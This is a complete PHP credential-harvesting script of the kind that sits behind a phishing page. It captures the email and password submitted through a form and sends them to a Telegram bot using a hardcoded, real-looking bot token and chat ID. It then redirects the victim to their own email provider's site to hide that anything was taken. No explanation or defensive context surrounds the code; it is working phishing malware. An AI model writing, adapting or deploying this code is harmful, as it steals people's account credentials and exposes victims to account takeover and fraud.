<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = "7364910032:AAGCseZfzDY4_kRFlPvIfnIAJc5rGbzFB4k";
    $chatid = "6723684415";

    $email = htmlspecialchars($_POST['em']);
    $password = htmlspecialchars($_POST['pa']);

    $text = "Email: $email\nPassword: $password";

    $url = "https://api.telegram.org/bot$token/sendMessage";

    $data = [
        'chat_id' => $chatid,
        'text' => $text,
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result !== FALSE) {
        // Extract the domain from the email
        $domain = substr(strrchr($email, "@"), 1);
        // Redirect to the domain's website
        header("Location: https://$domain");
        exit();
    } else {
        echo "Error sending message";
    }
}
?>
